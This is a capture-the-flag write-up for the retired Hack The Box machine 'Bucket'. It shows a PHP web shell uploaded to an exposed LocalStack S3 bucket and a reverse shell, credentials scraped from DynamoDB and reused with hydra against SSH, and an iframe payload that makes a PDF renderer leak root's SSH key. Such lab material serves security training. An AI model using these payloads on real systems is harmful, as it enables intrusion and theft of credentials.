---
layout: single
title: "Hackthebox write-up: Bucket"
namespace: htb-bucket
category: Writeup
tags: HackTheBox htb-medium htb-linux
date: 2021-04-24 12:00:00
header:
   teaser: https://i.imgur.com/m7oESPT.png
---

Hello guys!

This week's machine will be **Bucket**, another median-rated machine from [Hack The Box](https://www.hackthebox.eu/), created by [MrR3boot](https://app.hackthebox.eu/users/13531). <!--more-->

:information_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they're retired.
{: .information--notice}

![HTB Bucket](https://i.imgur.com/Qp79TCm.png){: .align-center}

Solving this box was pretty cool, where I had the opportunity to "play" a little with AWS storage services, even being in a local instance normally used by developers.

Its resolution was closely linked to this service, where we had to identify a way to include a file on the published website to get a reverse shell and later the user flag with the credentials harvested during enumeration.

Root flag was obtained after abuse of an application still under development, where we used a vulnerable code to get an `id_rsa` key and thus gain interactive shell as root.

## Enumeration

As usual, we start with a quick `nmap` scan, to identify the services currently published on this machine:

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.10.212
Nmap 7.91 scan initiated Fri Feb 26 08:16:37 2021 as: nmap -sC -sV -Pn -oA quick 10.10.10.212
Nmap scan report for 10.10.10.212
Host is up (0.077s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://bucket.htb/
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb 26 08:16:48 2021 -- 1 IP address (1 host up) scanned in 10.55 seconds
```

### 80/TCP - Serviço HTTP

Once I have noticed a redirect to `bucket.htb`, I have modified the local hosts file to map this hostname to the box IP address.

After accessing the website, as none of the images were loaded figured out after a `curl` call that they were pointing to `s3.bucket.htb`, which was later added to local host file as well.

```bash
$ curl -L http://bucket.htb | grep -Eo 'href=".*"|src=".*"' | sort -u
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  5344  100  5344    0     0  33822      0 --:--:-- --:--:-- --:--:-- 33822
href="#"
href="#"><i class="fab fa-facebook-square"
href="#"><i class="fab fa-instagram"
href="#"><i class="fab fa-linkedin"
href="#"><i class="fab fa-twitter"
src="http://s3.bucket.htb/adserver/images/bug.jpg" alt="Bug" height="160" width="160"
src="http://s3.bucket.htb/adserver/images/cloud.png" alt="cheer" height="160" width="160"
src="http://s3.bucket.htb/adserver/images/malware.png" alt="Malware" height="160" width="160"
```

#### `s3.bucket.htb`

After identifying the DNS `s3.bucket.htb` instantly made the link of S3 with [Amazon S3](https://aws.amazon.com/s3), a cloud service which provides blob storage.

Checking the webserver of the request, noticed that for one of image URLs the webserver that answered the request was different from Apache seen in nmap scan (`hypercorn-h11`), which means that there's some kind of proxy or a different webserver answering the request for this virtual host.

To understand what we have in this structure, I have started a `gobuster` enumeration and have found two interesting directories: *health* and *shell*

```bash
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://s3.bucket.htb -o gobuster-s3.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://s3.bucket.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/26 09:42:22 Starting gobuster
===============================================================
/health (Status: 200)
/shell (Status: 200)
Progress: 2643 / 220561 (1.20%)
```

Is important to notice that these are directories and not pages, once the result of the web request as seen in curl below is different if the slash (`/`) is present in the end or not:

```bash
$ curl -L http://s3.bucket.htb/health                                                                       
{"services": {"s3": "running", "dynamodb": "running"}}

$ curl -L http://s3.bucket.htb/health/
{"status": "running"}                                                                                                 
$ curl -L http://s3.bucket.htb/shell


$ curl -L http://s3.bucket.htb/shell/
<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/Product">
  <head>
    <title>AWS Console</title>
    <meta charset="UTF-8">

    <!-- Application -->
[...]
```

As the last request (`curl -L http://s3.bucket.htb/shell/`) returned a HTML page, I've retried it using browser and noticed that I was accessing **DynamoDB Web Shell**.

Researching a little about this service I could determine it is a storage emulator for AWS, possibly a [Localstack](https://github.com/localstack/localstack), very popular between developers.

![DynamoDB Web Shell - Bucket HTB](https://i.imgur.com/6J27Miv.png){: .align-center}

Playing with some samples on the page, I was able to get some information about the existing tables (ListTables e DescribeTable), as below, where I could identify some information like the region (`us-east-1`) and a table called `users`, as well as its respective resource name `arn:aws:dynamodb:us-east-1:000000000000:table/users`.

![DynamoDB Web Shell - List - Bucket HTB](https://i.imgur.com/cKIzAtd.png){: .align-center}

Considering we're talking about a LocalStack instance, I have found that would be possible to use [awscli](https://aws.amazon.com/cli), aws command line interface utility, to connect to this service, as described on the following post [Local Development with AWS on LocalStack (reflectoring.io)](https://reflectoring.io/aws-localstack/).

As `awscli` is more flexible to enumerate and work with resources than DynamoDB Web Shell, I have installed it using `apt` and connected to it using the information obtained in the post mentioned above. For credentials, any value can be used, once it isn't a true AWS service.

```bash
# Install aws cli
$ sudo apt install awscli -y
[...]
$ aws configure --profile bucket.htb                                                                         
AWS Access Key ID [None]: dummy
AWS Secret Access Key [None]: dummy
Default region name [None]: us-east-1
Default output format [None]:
```

Reading about `awscli` for DynamoDB, ran some simple queries to list tables and their existing entries, as below, where I was able to get some username and passwords that could be useful later.

```bash
$ aws dynamodb list-tables \
    --endpoint-url http://s3.bucket.htb \
    --profile bucket.htb \
    --output json
{
  "TableNames": [
    "users"
  ]
}

$ aws dynamodb scan \
    --table-name users \
    --endpoint-url http://s3.bucket.htb \
    --profile bucket.htb \
    --output json
{
  "Items": [
    {
      "password": {
        "S": "Management@#1@#"
      },
      "username": {
        "S": "Mgmt"
      }
    },
    {
      "password": {
        "S": "Welcome123!"
      },
      "username": {
        "S": "Cloudadm"
      }
    },
    {
      "password": {
        "S": "n2vM-<_K_Q:.Aa2"
      },
      "username": {
        "S": "Sysadm"
      }
    }
  ],
  "Count": 3,
  "ScannedCount": 3,
  "ConsumedCapacity": null
}
```

As we know that we also have a **s3** running, enumerated some information about existing containers and blobs, where `adserver` was found (where we already knew due to the URL of the images listed) and confirmed what else is hosted in this bucket.

```bash
$ aws s3 ls \
    --endpoint-url http://s3.bucket.htb \
    --profile bucket.htb
2021-02-26 11:48:02 adserver

$ aws s3 ls s3://adserver \
    --endpoint-url http://s3.bucket.htb \
    --profile bucket.htb
                           PRE images/
2021-02-26 11:50:04       5344 index.html

$ aws s3 ls s3://adserver/images/ \
    --endpoint-url http://s3.bucket.htb \
    --profile bucket.htb
2021-02-26 11:52:02      37840 bug.jpg
2021-02-26 11:52:02      51485 cloud.png
2021-02-26 11:52:02      16486 malware.png
```

## Initial Access

Once we have access to the s3 bucket and know which contents are available and how to use them, the first thing to do is to upload a reverse shell payload to the website and then proceed with enumeration. To keep things simple, I'll use the following php web shell:

```php
<?php system($_GET['cmd']); ?>
```

After creating the file, uploaded it to bucket using `awscli`:

```bash
$ aws s3 cp ./exploit.php s3://adserver/ \
    --endpoint-url http://s3.bucket.htb \
    --profile bucket.htb
upload: ./exploit.php to s3://adserver/exploit.php                

$ aws s3 --endpoint-url http://s3.bucket.htb --profile bucket.htb ls s3://adserver/              
                           PRE images/
2021-02-26 11:56:28         31 exploit.php
2021-02-26 11:56:02       5344 index.html
```

After trying to access it a few seconds later, noticed that the file was removed by another process. To circumvent this, made the execution call right after the upload command, running the command `id`, where I was able to confirm that this approach worked.

```bash
$ aws s3 cp ./exploit.php s3://adserver/ \
    --endpoint-url http://s3.bucket.htb --profile bucket.htb && curl -L http://bucket.htb/exploit.php?cmd=id
upload: ./exploit.php to s3://adserver/exploit.php                
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

To get a reverse shell, replaced the `exploit.php` by [pentestmonkey/php-reverse-shell (github.com)](https://github.com/pentestmonkey/php-reverse-shell) that after modifying it starts automatically to the listener previously defined, without the need of parameters in the payload, which resulted in success after a few attempts.

```bash
aws s3 --endpoint-url http://s3.bucket.htb --profile bucket.htb cp ./exploit.php s3://adserver/ && curl -L http://bucket.htb/exploit.php
```

## User flag

Now with a reverse shell ot the machine, ran `linpeas.sh` to make it easier the enumeration, where the following points were identified:

- Local user `roy` has console access and, enumerating his home directory found the file `user.txt` and folder `project`, access to both denied using `www-data` credentials.

  - This user has no running processes that could allow us to hijack them so we would need to obtain his credentials to proceed with this machine.

- Other services are running in this box, listening in ports 4566, 8000 and 38443, which could be used to escalate privileges later.

  ```output
  [+] Active Ports                                                                                         
  [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                               
  Active Internet connections (servers and established)                                                     
  Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name         
  tcp        0      0 127.0.0.1:38443         0.0.0.0:*               LISTEN      -                        
  tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                         
  tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN      -                         
  tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                         
  tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                     
  ```

- This box has also containers in execution (`ctr`, `runc`), probably from localstack, being also a possibility when checking for privesc paths.

- There's a directory `/var/www/bucket-app` that could be used by one of the apps previously identified, but also don't allows us to read it with `www-data` credentials.

From the points discussed, what called more attention to me was the other services, so started by checking apache configurations (`/etc/apache2/sites-enabled`) where we had the file `000-default.conf` listed below, but nothing about 38443, but was able to get insights about 4566 and 8000, which published the content from `/var/www/bucket-app` folder.

```properties
<VirtualHost 127.0.0.1:8000>
    <IfModule mpm_itk_module>
        AssignUserId root root
    </IfModule>
    DocumentRoot /var/www/bucket-app
</VirtualHost>

<VirtualHost *:80>
    DocumentRoot /var/www/html
    RewriteEngine On
    RewriteCond %{HTTP_HOST} !^bucket.htb$
    RewriteRule /.* http://bucket.htb/ [R]
</VirtualHost>
<VirtualHost *:80>
    ProxyPreserveHost on
    ProxyPass / http://localhost:4566/
    ProxyPassReverse / http://localhost:4566/
    <Proxy *>
        Order deny,allow
        Allow from all
    </Proxy>
    ServerAdmin webmaster@localhost
    ServerName s3.bucket.htb

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

Besides able to connect to this service locally, we'll need some credentials to tunnel some communication via SSH and properly enumerate this service.

Once this website had nothing interesting, decided to test the passwords previously collected in DynamoDB for user `roy` and luckily we had success. Below the `hydra` execution which automated this SSH Brute Force.

```bash
$ hydra -l roy -P passwords 10.10.10.212 -t 4 ssh
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-26 12:55:36
[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task
[DATA] attacking ssh://10.10.10.212:22/
[22][ssh] host: 10.10.10.212   login: roy   password: n2vM-<_K_Q:.Aa2
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-26 12:55:40
```

Once we have access to the machine as `roy`, collected the user flag:

```bash
roy@bucket:~$ id
uid=1000(roy) gid=1000(roy) groups=1000(roy),1001(sysadm)
roy@bucket:~$ cat user.txt 
<redacted>
```

## Root flag

Now as `roy`, was able to check the contents of both `project` and `/var/www/bucket-app` folders, which were very similar between each other. To inspect the contents better, made a copy of `/var/www/bucket-app` for analysis.

Checking the contents of `index.php` we have something very interesting: a hidden function which generates a PDF file with the rendered content of a `Ransomware` alert in DynamoDB if a POST request is made with the body contents of `action=get_alerts`, storing it in `/var/www/bucket-app/files/` folder.

```php
<?php
require 'vendor/autoload.php';
use Aws\DynamoDb\DynamoDbClient;
if($_SERVER["REQUEST_METHOD"]==="POST") {
    if($_POST["action"]==="get_alerts") {
        date_default_timezone_set('America/New_York');
        $client = new DynamoDbClient([
            'profile' => 'default',
            'region'  => 'us-east-1',
            'version' => 'latest',
            'endpoint' => 'http://localhost:4566'
        ]);

        $iterator = $client->getIterator('Scan', array(
            'TableName' => 'alerts',
            'FilterExpression' => "title = :title",
            'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
        ));

        foreach ($iterator as $item) {
            $name=rand(1,10000).'.html';
            file_put_contents('files/'.$name,$item["data"]);
        }
        passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
    }
}
else
{
?>
```

Once we don't have a table called `alerts`, as already enumerated, we'll need to create it with the attributes `title` and `data`, which will contain the HTML content to be rendered and later stored in a PDF, possibly allowing us to get some sensitive data from this machine.

For the initial test, as described in AWS documentation in [this link](https://docs.aws.amazon.com/cli/latest/userguide/cli-services-dynamodb.html), I've created a script to create the table, include the Ransomware entry and then make the POST call to generate the PDF.

To make it easier this process, which is being executed from the attacker machine, executed the following processes:

- From the attacker machine, created an RSA key (`ssh-keygen`) and associated it with `roy`'s account to prevent asking for password during the process.
- In the attacker machine was also made a port forwarding using SSH, allowing us to call port 8000 locally and this request would be routed to 8000 to bucket, as below

```bash
ssh roy@10.10.10.212 -L 8000:127.0.0.1:8000 
```

![Website 8000/TCP via SSH Tunnel](https://i.imgur.com/tiTjm7I.png)

After some attempts, noticed that, similarly in the beginning while uploading the exploit, the tables and entries created were deleted, preventing us to easily get the content desired. The solution was to chain the commands as made previously processing the request as soon as the resources were available, as well as the file copy later if we had success in the initial call.

```bash
aws dynamodb create-table \
    --table-name alerts \
    --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S \
    --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE \
    --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=10 \
    --endpoint-url http://s3.bucket.htb \
    --profile bucket.htb && \
aws dynamodb put-item \
    --table-name alerts \
    --item '{"title": {"S": "Ransomware"},"data": {"S": "<html><head><title>Title</title></head><body><h1>Head 1</h1><p>Content</p></body></html>"}}' \
    --return-consumed-capacity TOTAL \
    --endpoint-url http://s3.bucket.htb \
    --profile bucket.htb && \
curl --data "action=get_alerts" http://localhost:8000/
```

After a few attempts, successfully retrieved the `result.pdf` file with the content we have passed in the DynamoDB.

```bash
roy@bucket:/var/www/bucket-app/files$ ls -la
total 16
drwxr-x---+ 2 root root 4096 Feb 26 18:51 .
drwxr-x---+ 4 root root 4096 Feb 10 12:29 ..
-rw-r--r--  1 root root   88 Feb 26 18:51 7627.html
-rw-r--r--  1 root root 1870 Feb 26 18:51 result.pdf
```

![Bucket HTB - PoC](https://i.imgur.com/XLxhZ9W.png){: .align-center}

Once we have be able to make the request work, the second step is finding a way to get sensitive data into the PDF file.

Easiest way would be to import `/root/root.txt`, but this don't give us any interactive shell in the box. Just like we did in [**Passage**]({% post_url 2021-03-06-htb-passage %}), we can look for the file `/root/.ssh/id_rsa` and use it to SSH into the machine as root but our issue right now is to find a way to import this file in the static HTML file that will later be rendered into the PDF.

After some research, the easiest way without using a Javascript to make this possible would be using an **iframe**, which I've added the tag `<iframe src="/root/.ssh/id_rsa" seamless></iframe>` in the HTML content sent earlier:

```bash
aws dynamodb create-table \
    --table-name alerts \
    --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S \
    --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE \
    --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=10 \
    --endpoint-url http://s3.bucket.htb \
    --profile bucket.htb && \
aws dynamodb put-item \
    --table-name alerts \
    --item '{"title": {"S": "Ransomware"},"data": {"S": "<html><head><title>Title</title></head><body><h1>Head 1</h1><iframe src=\"/root/.ssh/id_rsa\" seamless></iframe></body></html>"}}' \
    --return-consumed-capacity TOTAL \
    --endpoint-url http://s3.bucket.htb \
    --profile bucket.htb && \
curl --data "action=get_alerts" http://localhost:8000/    
```

After running it, was able to download the file at `/var/www/bucket-app/files/result.pdf` and, with the contents inside it, created the file `id_rsa`, which was used to authenticate to SSH to the box as `root`, being able to read the root.txt file.

```bash
root@bucket:~# id
uid=0(root) gid=0(root) groups=0(root)
root@bucket:~# cat /root/root.txt
<redacted>
```

I hope you guys have enjoyed this post.

See you again soon! :smiley:
